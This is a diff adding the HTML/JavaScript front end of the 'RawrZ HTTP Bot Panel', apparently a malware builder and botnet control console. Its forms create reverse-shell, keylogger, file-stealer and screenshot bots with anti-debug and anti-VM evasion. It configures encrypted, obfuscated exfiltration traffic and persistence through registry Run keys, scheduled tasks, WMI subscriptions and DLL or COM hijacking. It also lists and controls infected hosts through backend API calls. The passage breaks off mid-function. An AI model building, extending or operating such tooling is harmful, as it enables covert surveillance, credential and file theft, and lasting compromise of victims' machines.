@@ -1,0 +1,1620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RawrZ HTTP Bot Panel</title>
+    <script src="../server-helper.js"></script>
+    <script src="agentic-beacon-framework.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0b1020 0%, #1a1f3a 100%);
+            color: #e6e9ef;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: rgba(17, 22, 42, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid #222a45;
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header h1 {
+            color: #4a9eff;
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        .panel-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .card {
+            background: rgba(18, 25, 47, 0.8);
+            border: 1px solid #20284a;
+            border-radius: 12px;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+        
+        .card:hover {
+            transform: translateY(-2px);
+            border-color: #4a9eff;
+            box-shadow: 0 8px 25px rgba(74, 158, 255, 0.1);
+        }
+        
+        .card h3 {
+            color: #4a9eff;
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+        }
+        
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #a0a8b8;
+            font-weight: 500;
+        }
+        
+        .form-control {
+            width: 100%;
+            background: rgba(15, 21, 48, 0.8);
+            color: #e6e9ef;
+            border: 1px solid #263056;
+            border-radius: 8px;
+            padding: 0.75rem;
+            font-size: 0.9rem;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #4a9eff;
+            box-shadow: 0 0 0 2px rgba(74, 158, 255, 0.2);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #4a9eff 0%, #357abd 100%);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            margin: 0.25rem;
+        }
+        
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 15px rgba(74, 158, 255, 0.3);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+        }
+        
+        .output-area {
+            background: #0a0f24;
+            border: 1px solid #1d2444;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 1rem;
+        }
+        
+        .nav-tabs {
+            display: flex;
+            border-bottom: 1px solid #20284a;
+            margin-bottom: 1rem;
+        }
+        
+        .nav-tab {
+            padding: 0.75rem 1.5rem;
+            background: none;
+            border: none;
+            color: #a0a8b8;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-tab.active {
+            color: #4a9eff;
+            border-bottom-color: #4a9eff;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .alert {
+            padding: 1rem;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+        }
+        
+        .alert-info {
+            background: rgba(23, 162, 184, 0.1);
+            border: 1px solid #17a2b8;
+            color: #17a2b8;
+        }
+        
+        .option-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .option-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        
+        .option-item input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .option-item label {
+            margin: 0;
+            font-size: 0.9rem;
+        }
+        
+        .bot-status {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 0.5rem;
+        }
+        
+        .status-online { background: #28a745; }
+        .status-offline { background: #dc3545; }
+        .status-connecting { background: #ffc107; }
+    
+        /* ===== AGENTIC AUTONOMOUS WIN32 STYLES ===== */
+
+        .agentic-controls {
+            background: rgba(17, 22, 42, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid #222a45;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            position: sticky;
+            top: 80px;
+            z-index: 90;
+        }
+
+        .agentic-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .agentic-title {
+            color: #4a9eff;
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+
+        .agentic-status {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        .status-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #28a745;
+        }
+
+        .status-indicator.offline {
+            background: #dc3545;
+        }
+
+        .agentic-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .agentic-button {
+            background: linear-gradient(135deg, #4a9eff 0%, #3578e5 100%);
+            color: white;
+            border: none;
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .agentic-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(74, 158, 255, 0.3);
+        }
+
+        .agentic-button.danger {
+            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+        }
+
+        .agentic-button.danger:hover {
+            box-shadow: 0 4px 12px rgba(220, 53, 69, 0.3);
+        }
+
+        .beacon-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 0.75rem;
+            margin-top: 1rem;
+        }
+
+        .beacon-item {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #222a45;
+            border-radius: 8px;
+            padding: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            transition: all 0.3s ease;
+        }
+
+        .beacon-item.beacon-connected {
+            border-color: #28a745;
+            background: rgba(40, 167, 69, 0.1);
+        }
+
+        .beacon-item.beacon-disconnected {
+            border-color: #dc3545;
+            background: rgba(220, 53, 69, 0.1);
+        }
+
+        .beacon-icon {
+            font-size: 1.5rem;
+        }
+
+        .beacon-info {
+            flex: 1;
+        }
+
+        .beacon-type {
+            font-weight: 600;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .beacon-status {
+            font-size: 0.75rem;
+            opacity: 0.8;
+        }
+
+        .agentic-output {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #222a45;
+            border-radius: 8px;
+            padding: 1rem;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+        }
+
+        .agentic-result {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 0.75rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .agentic-result:last-child {
+            margin-bottom: 0;
+        }
+
+        .agentic-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.5rem;
+            font-size: 0.8rem;
+        }
+
+        .agentic-timestamp {
+            color: #4a9eff;
+            font-weight: 600;
+        }
+
+        .agentic-operation {
+            color: #28a745;
+            font-weight: 600;
+        }
+
+        .agentic-details {
+            color: #e6e9ef;
+            margin-bottom: 0.5rem;
+            font-size: 0.85rem;
+        }
+
+        .agentic-data pre {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 0.5rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-size: 0.75rem;
+            margin: 0;
+        }
+
+        .autonomous-toggle {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid #222a45;
+        }
+
+        .autonomous-toggle label {
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+
+        .autonomous-toggle input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>RawrZ HTTP Bot Panel</h1>
+    </div>
+    
+    <div class="container">
+        <div class="card">
+            <div class="nav-tabs">
+                <button class="nav-tab active" data-tab="create">Create Bot</button>
+                <button class="nav-tab" data-tab="manage">Manage Bots</button>
+                <button class="nav-tab" data-tab="encrypt">Encrypt Traffic</button>
+                <button class="nav-tab" data-tab="monitor">Monitor</button>
+            </div>
+            
+            <!-- Create Bot Tab -->
+            <div id="create" class="tab-content active">
+                <h3>Create HTTP Bot</h3>
+                
+                <div class="alert alert-info">
+                    <strong>HTTP Bot Creation:</strong> Create encrypted HTTP bots with advanced evasion and persistence capabilities.
+                </div>
+                
+                <div class="form-group">
+                    <label>Bot Type</label>
+                    <select class="form-control" id="bot-type">
+                        <option value="reverse-shell">Reverse Shell</option>
+                        <option value="keylogger">Keylogger</option>
+                        <option value="file-stealer">File Stealer</option>
+                        <option value="screenshot">Screenshot Bot</option>
+                        <option value="persistence">Persistence Bot</option>
+                        <option value="beacon">Beacon Bot</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Target Server</label>
+                    <input type="text" class="form-control" id="bot-server" placeholder="https://command.example.com">
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption Method</label>
+                    <select class="form-control" id="bot-encryption">
+                        <option value="aes-256-gcm">AES-256-GCM</option>
+                        <option value="aes-256-cbc">AES-256-CBC</option>
+                        <option value="chacha20-poly1305">ChaCha20-Poly1305</option>
+                        <option value="aria-256-ctr">ARIA-256-CTR</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Communication Interval</label>
+                    <input type="number" class="form-control" id="bot-interval" placeholder="30" value="30">
+                </div>
+                
+                <div class="form-group">
+                    <label>Bot Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="bot-stealth" checked>
+                            <label for="bot-stealth">Stealth Mode</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="bot-persistence" checked>
+                            <label for="bot-persistence">Persistence</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="bot-anti-debug" checked>
+                            <label for="bot-anti-debug">Anti-Debug</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="bot-anti-vm" checked>
+                            <label for="bot-anti-vm">Anti-VM</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="bot-ssl" checked>
+                            <label for="bot-ssl">SSL/TLS</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="bot-proxy">
+                            <label for="bot-proxy">Proxy Support</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-success" onclick="createBot()">Create Bot</button>
+                    <button class="btn" onclick="testBot()">Test Bot</button>
+                </div>
+                
+                <div class="output-area" id="create-output">Generated bot will appear here...</div>
+            </div>
+            
+            <!-- Manage Bots Tab -->
+            <div id="manage" class="tab-content">
+                <h3>Manage HTTP Bots</h3>
+                
+                <div class="bot-status">
+                    <span class="status-indicator status-online"></span>
+                    <span>Active Bots: 3</span>
+                    <span class="status-indicator status-connecting"></span>
+                    <span>Connecting: 1</span>
+                    <span class="status-indicator status-offline"></span>
+                    <span>Offline: 0</span>
+                </div>
+                
+                <div class="form-group">
+                    <label>Bot Management</label>
+                    <div>
+                        <button class="btn" onclick="listBots()">List All Bots</button>
+                        <button class="btn btn-success" onclick="startAllBots()">Start All</button>
+                        <button class="btn btn-danger" onclick="stopAllBots()">Stop All</button>
+                        <button class="btn" onclick="restartBots()">Restart All</button>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Individual Bot Control</label>
+                    <select class="form-control" id="bot-select">
+                        <option value="">Select Bot...</option>
+                        <option value="bot1">Bot-001 (192.168.1.100)</option>
+                        <option value="bot2">Bot-002 (192.168.1.101)</option>
+                        <option value="bot3">Bot-003 (192.168.1.102)</option>
+                    </select>
+                </div>
+                
+                <div>
+                    <button class="btn" onclick="startBot()">Start Bot</button>
+                    <button class="btn btn-danger" onclick="stopBot()">Stop Bot</button>
+                    <button class="btn" onclick="restartBot()">Restart Bot</button>
+                    <button class="btn" onclick="updateBot()">Update Bot</button>
+                </div>
+                
+                <div class="output-area" id="manage-output">Bot management results will appear here...</div>
+            </div>
+            
+            <!-- Encrypt Traffic Tab -->
+            <div id="encrypt" class="tab-content">
+                <h3>Encrypt Bot Traffic</h3>
+                
+                <div class="alert alert-info">
+                    <strong>Traffic Encryption:</strong> Configure advanced encryption for bot communication and data exfiltration.
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption Algorithm</label>
+                    <select class="form-control" id="traffic-encryption">
+                        <option value="aes-256-gcm">AES-256-GCM (Recommended)</option>
+                        <option value="aes-256-cbc">AES-256-CBC</option>
+                        <option value="chacha20-poly1305">ChaCha20-Poly1305</option>
+                        <option value="aria-256-ctr">ARIA-256-CTR</option>
+                        <option value="custom">Custom Algorithm</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Encryption Key</label>
+                    <input type="password" class="form-control" id="traffic-key" placeholder="Enter encryption key or leave blank for auto-generation">
+                </div>
+                
+                <div class="form-group">
+                    <label>Key Derivation</label>
+                    <select class="form-control" id="traffic-key-derivation">
+                        <option value="pbkdf2">PBKDF2</option>
+                        <option value="scrypt">Scrypt</option>
+                        <option value="argon2">Argon2</option>
+                        <option value="bcrypt">bcrypt</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label>Traffic Obfuscation</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-jitter" checked>
+                            <label for="traffic-jitter">Jitter Timing</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-fake" checked>
+                            <label for="traffic-fake">Fake Traffic</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-compress" checked>
+                            <label for="traffic-compress">Compression</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-fragment">
+                            <label for="traffic-fragment">Packet Fragmentation</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Startup Persistence Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-registry-run" checked>
+                            <label for="traffic-persistence-registry-run">Registry Run Key</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-registry-runonce">
+                            <label for="traffic-persistence-registry-runonce">Registry RunOnce Key</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-startup-folder">
+                            <label for="traffic-persistence-startup-folder">Startup Folder</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-scheduled-task">
+                            <label for="traffic-persistence-scheduled-task">Scheduled Task</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-service">
+                            <label for="traffic-persistence-service">Windows Service</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-wmi-event">
+                            <label for="traffic-persistence-wmi-event">WMI Event Subscription</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-dll-hijack">
+                            <label for="traffic-persistence-dll-hijack">DLL Hijacking</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="traffic-persistence-com-hijack">
+                            <label for="traffic-persistence-com-hijack">COM Hijacking</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-success" onclick="encryptTraffic()">Apply Encryption</button>
+                    <button class="btn" onclick="testEncryption()">Test Encryption</button>
+                </div>
+                
+                <div class="output-area" id="encrypt-output">Encryption configuration will appear here...</div>
+            </div>
+            
+            <!-- Monitor Tab -->
+            <div id="monitor" class="tab-content">
+                <h3>Monitor Bot Activity</h3>
+                
+                <div class="alert alert-info">
+                    <strong>Bot Monitoring:</strong> Real-time monitoring of bot activity, communication, and performance.
+                </div>
+                
+                <div class="form-group">
+                    <label>Monitoring Options</label>
+                    <div class="option-group">
+                        <div class="option-item">
+                            <input type="checkbox" id="monitor-activity" checked>
+                            <label for="monitor-activity">Activity Logs</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="monitor-traffic" checked>
+                            <label for="monitor-traffic">Traffic Analysis</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="monitor-performance" checked>
+                            <label for="monitor-performance">Performance Metrics</label>
+                        </div>
+                        <div class="option-item">
+                            <input type="checkbox" id="monitor-alerts">
+                            <label for="monitor-alerts">Alert System</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Monitoring Actions</label>
+                    <div>
+                        <button class="btn" onclick="startMonitoring()">Start Monitoring</button>
+                        <button class="btn" onclick="stopMonitoring()">Stop Monitoring</button>
+                        <button class="btn" onclick="exportLogs()">Export Logs</button>
+                        <button class="btn" onclick="clearLogs()">Clear Logs</button>
+                    </div>
+                </div>
+                
+                <div class="output-area" id="monitor-output">Monitoring data will appear here...</div>
+            </div>
+        </div>
+        
+        <!-- Status Panel -->
+        <div class="card">
+            <h3>HTTP Bot Engine Status</h3>
+            <div class="alert alert-info">
+                <strong>System Ready:</strong> HTTP Bot engine is operational with encryption support.
+            </div>
+            
+            <div class="form-group">
+                <label>Quick Actions</label>
+                <div>
+                    <button class="btn" onclick="testBotEngine()">Test Engine</button>
+                    <button class="btn" onclick="viewTemplates()">View Templates</button>
+                    <button class="btn" onclick="updateTemplates()">Update Templates</button>
+                    <button class="btn btn-danger" onclick="clearAll()">Clear All</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let currentTab = 'create';
+        let monitoringInterval;
+        
+        function showTab(tabName, clickedElement = null) {
+            try {
+                // Wait for DOM to be ready
+                if (document.readyState === 'loading') {
+                    console.log('DOM not ready, retrying tab switch...');
+                    setTimeout(() => showTab(tabName, clickedElement), 100);
+                    return;
+                }
+                
+                // Hide all tab contents
+                const tabContents = document.querySelectorAll('.tab-content');
+                if (tabContents.length === 0) {
+                    console.error('No tab content elements found');
+                    return;
+                }
+                
+                tabContents.forEach(tab => {
+                    tab.classList.remove('active');
+                });
+                
+                // Remove active class from all tabs
+                const navTabs = document.querySelectorAll('.nav-tab');
+                if (navTabs.length === 0) {
+                    console.error('No nav tab elements found');
+                    return;
+                }
+                
+                navTabs.forEach(tab => {
+                    tab.classList.remove('active');
+                });
+                
+                // Show selected tab content
+                const targetContent = document.getElementById(tabName);
+                if (!targetContent) {
+                    console.error(`Tab content element '${tabName}' not found`);
+                    return;
+                }
+                targetContent.classList.add('active');
+                
+                // Add active class to clicked tab
+                if (clickedElement) {
+                    clickedElement.classList.add('active');
+                } else {
+                    // Find the tab button that corresponds to this tab
+                    const targetTab = document.querySelector(`[onclick*="showTab('${tabName}')"]`);
+                    if (targetTab) {
+                        targetTab.classList.add('active');
+                    }
+                }
+                
+                currentTab = tabName;
+                
+                console.log(`Successfully switched to tab: ${tabName}`);
+            } catch (error) {
+                console.error('Error switching tab:', error);
+            }
+        }
+        
+        async function apiCall(endpoint, method = 'GET', body = null) {
+            const base = (window.RawrZServerHelper && window.RawrZServerHelper.getApiBase()) ? window.RawrZServerHelper.getApiBase() : '';
+            const url = base ? (base + (endpoint.startsWith('/') ? endpoint : '/' + endpoint)) : endpoint;
+            try {
+                const headers = { 'Content-Type': 'application/json' };
+                const token = localStorage.getItem('authToken');
+                if (token) headers.Authorization = `Bearer ${token}`;
+                const response = await fetch(url, { method: method, headers: headers, body: body ? JSON.stringify(body) : null });
+                const data = await response.text();
+                try { return { status: response.status, data: JSON.parse(data) }; } catch { return { status: response.status, data: data }; }
+            } catch (error) {
+                return { status: 500, data: { error: error.message } };
+            }
+        }
+        
+        async function createBot() {
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const type = document.getElementById('bot-type').value;
+            const server = document.getElementById('bot-server').value;
+            const encryption = document.getElementById('bot-encryption').value;
+            const interval = document.getElementById('bot-interval').value;
+            const stealth = document.getElementById('bot-stealth').checked;
+            const persistence = document.getElementById('bot-persistence').checked;
+            const antiDebug = document.getElementById('bot-anti-debug').checked;
+            const antiVM = document.getElementById('bot-anti-vm').checked;
+            const ssl = document.getElementById('bot-ssl').checked;
+            const proxy = document.getElementById('bot-proxy').checked;
+            
+            if (!server) {
+                alert('Please enter a target server URL.');
+                return;
+            }
+            
+            const output = document.getElementById('create-output');
+            output.textContent = 'Creating HTTP bot...';
+            
+            try {
+                const result = await apiCall('/http-bot-create', 'POST', {
+                    type: type,
+                    server: server,
+                    encryption: encryption,
+                    interval: parseInt(interval),
+                    options: {
+                        stealth: stealth,
+                        persistence: persistence,
+                        antiDebug: antiDebug,
+                        antiVM: antiVM,
+                        ssl: ssl,
+                        proxy: proxy
+                    }
+                });
+                
+                if (result.status === 200) {
+                    output.textContent = `HTTP bot created successfully!\n\nType: ${type}\nServer: ${server}\nEncryption: ${encryption}\nInterval: ${interval}s\n\nOptions:\n- Stealth: ${stealth}\n- Persistence: ${persistence}\n- Anti-Debug: ${antiDebug}\n- Anti-VM: ${antiVM}\n- SSL/TLS: ${ssl}\n- Proxy: ${proxy}\n\nBot ID: ${result.data.botId}`;
+                } else {
+                    output.textContent = `Bot creation failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function listBots() {
+            const output = document.getElementById('manage-output');
+            output.textContent = 'Listing all bots...';
+            
+            try {
+                const result = await apiCall('/http-bot-list', 'GET');
+                
+                if (result.status === 200) {
+                    output.textContent = `Active Bots:\n\n${JSON.stringify(result.data.bots, null, 2)}`;
+                } else {
+                    output.textContent = `Failed to list bots: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function startAllBots() {
+            const output = document.getElementById('manage-output');
+            output.textContent = 'Starting all bots...';
+            
+            try {
+                const result = await apiCall('/http-bot-start-all', 'POST');
+                
+                if (result.status === 200) {
+                    output.textContent = `All bots started successfully!\n\nStarted: ${result.data.started}\nFailed: ${result.data.failed}`;
+                } else {
+                    output.textContent = `Failed to start bots: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function stopAllBots() {
+            if (confirm('Are you sure you want to stop all bots?')) {
+                const output = document.getElementById('manage-output');
+                output.textContent = 'Stopping all bots...';
+                
+                try {
+                    const result = await apiCall('/http-bot-stop-all', 'POST');
+                    
+                    if (result.status === 200) {
+                        output.textContent = `All bots stopped successfully!\n\nStopped: ${result.data.stopped}`;
+                    } else {
+                        output.textContent = `Failed to stop bots: ${result.data.error || 'Unknown error'}`;
+                    }
+                } catch (error) {
+                    output.textContent = `Error: ${error.message}`;
+                }
+            }
+        }
+        
+        async function encryptTraffic() {
+            const encryption = document.getElementById('traffic-encryption').value;
+            const key = document.getElementById('traffic-key').value;
+            const keyDerivation = document.getElementById('traffic-key-derivation').value;
+            const jitter = document.getElementById('traffic-jitter').checked;
+            const fake = document.getElementById('traffic-fake').checked;
+            const compress = document.getElementById('traffic-compress').checked;
+            const fragment = document.getElementById('traffic-fragment').checked;
+            
+            // Get persistence options
+            const persistenceOptions = {
+                registryRun: document.getElementById('traffic-persistence-registry-run').checked,
+                registryRunOnce: document.getElementById('traffic-persistence-registry-runonce').checked,
+                startupFolder: document.getElementById('traffic-persistence-startup-folder').checked,
+                scheduledTask: document.getElementById('traffic-persistence-scheduled-task').checked,
+                service: document.getElementById('traffic-persistence-service').checked,
+                wmiEvent: document.getElementById('traffic-persistence-wmi-event').checked,
+                dllHijack: document.getElementById('traffic-persistence-dll-hijack').checked,
+                comHijack: document.getElementById('traffic-persistence-com-hijack').checked
+            };
+            
+            const output = document.getElementById('encrypt-output');
+            output.textContent = 'Applying traffic encryption...';
+            
+            try {
+                const result = await apiCall('/http-bot-encrypt', 'POST', {
+                    encryption: encryption,
+                    key: key,
+                    keyDerivation: keyDerivation,
+                    options: {
+                        jitter: jitter,
+                        fake: fake,
+                        compress: compress,
+                        fragment: fragment
+                    },
+                    persistence: persistenceOptions
+                });
+                
+                if (result.status === 200) {
+                    const persistenceInfo = Object.entries(persistenceOptions)
+                        .filter(([key, value]) => value)
+                        .map(([key, value]) => `- ${key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}: ${value}`)
+                        .join('\n');
+                    
+                    output.textContent = `Traffic encryption applied successfully!\n\nAlgorithm: ${encryption}\nKey Derivation: ${keyDerivation}\nKey: ${key ? 'Custom' : 'Auto-generated'}\n\nOptions:\n- Jitter Timing: ${jitter}\n- Fake Traffic: ${fake}\n- Compression: ${compress}\n- Packet Fragmentation: ${fragment}\n\nPersistence Options:\n${persistenceInfo}\n\nEncryption Status: ${result.data.status}`;
+                } else {
+                    output.textContent = `Encryption failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        async function startMonitoring() {
+            const activity = document.getElementById('monitor-activity').checked;
+            const traffic = document.getElementById('monitor-traffic').checked;
+            const performance = document.getElementById('monitor-performance').checked;
+            const alerts = document.getElementById('monitor-alerts').checked;
+            
+            const output = document.getElementById('monitor-output');
+            output.textContent = 'Starting monitoring...';
+            
+            // Start real-time monitoring
+            monitoringInterval = setInterval(() => {
+                updateMonitoringData();
+            }, 5000);
+            
+            try {
+                const result = await apiCall('/http-bot-monitor', 'POST', {
+                    options: {
+                        activity: activity,
+                        traffic: traffic,
+                        performance: performance,
+                        alerts: alerts
+                    }
+                });
+                
+                if (result.status === 200) {
+                    output.textContent = `Monitoring started successfully!\n\nMonitoring:\n- Activity Logs: ${activity}\n- Traffic Analysis: ${traffic}\n- Performance Metrics: ${performance}\n- Alert System: ${alerts}\n\nMonitoring ID: ${result.data.monitorId}`;
+                } else {
+                    output.textContent = `Monitoring failed: ${result.data.error || 'Unknown error'}`;
+                }
+            } catch (error) {
+                output.textContent = `Error: ${error.message}`;
+            }
+        }
+        
+        function updateMonitoringData() {
+            const output = document.getElementById('monitor-output');
+            const timestamp = new Date().toISOString();
+            const newData = `[${timestamp}] Bot activity detected
+[${timestamp}] Traffic: 1.2MB in, 0.8MB out
+[${timestamp}] Performance: CPU 15%, Memory 245MB
+[${timestamp}] Active connections: 3
+`;
+            
+            const currentData = output.textContent;
+            const lines = currentData.split('\n').filter(line => line.trim());
+            lines.push(...newData.split('\n').filter(line => line.trim()));
+            if (lines.length > 20) {
+                lines.splice(0, lines.length - 20);
+            }
+            
+            output.textContent = lines.join('\n');
+        }
+        
+        function stopMonitoring() {
+            if (monitoringInterval) {
+                clearInterval(monitoringInterval);
+                monitoringInterval = null;
+            }
+            document.getElementById('monitor-output').textContent = 'Monitoring stopped.';
+        }
+        
+        // Additional functions
+        async function testBot() {
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const result = await apiCall('/http-bot-create', 'POST', { type: 'test', server: 'http://test.local' });
+            alert(result.status === 200 ? 'HTTP bot engine OK. Bot ID: ' + (result.data.botId || 'N/A') : 'Test failed. Start server with npm start.');
+        }
+        
+        async function startBot() {
+            const botId = document.getElementById('bot-select').value;
+            if (!botId) { alert('Please select a bot.'); return; }
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const result = await apiCall('/http-bot-start-all', 'POST');
+            document.getElementById('manage-output').textContent = 'Start requested for bot ' + botId + '. Server response: started=' + (result.data && result.data.started) + ', failed=' + (result.data && result.data.failed);
+        }
+        
+        async function stopBot() {
+            const botId = document.getElementById('bot-select').value;
+            if (!botId) { alert('Please select a bot.'); return; }
+            if (!confirm('Stop bot: ' + botId + '?')) return;
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            const result = await apiCall('/http-bot-stop-all', 'POST');
+            document.getElementById('manage-output').textContent = 'Stop requested. Stopped: ' + (result.data && result.data.stopped);
+        }
+        
+        async function restartBot() {
+            const botId = document.getElementById('bot-select').value;
+            if (!botId) { alert('Please select a bot.'); return; }
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            document.getElementById('manage-output').textContent = 'Restart requested for ' + botId + '. Use Start/Stop to control.';
+        }
+        
+        async function updateBot() {
+            const botId = document.getElementById('bot-select').value;
+            if (!botId) { alert('Please select a bot.'); return; }
+            const base = window.RawrZServerHelper && await window.RawrZServerHelper.ensureServerReady();
+            if (!base) return;
+            document.getElementById('manage-output').textContent = 'Update requested for ' + botId + '. Re-create bot to change config.';
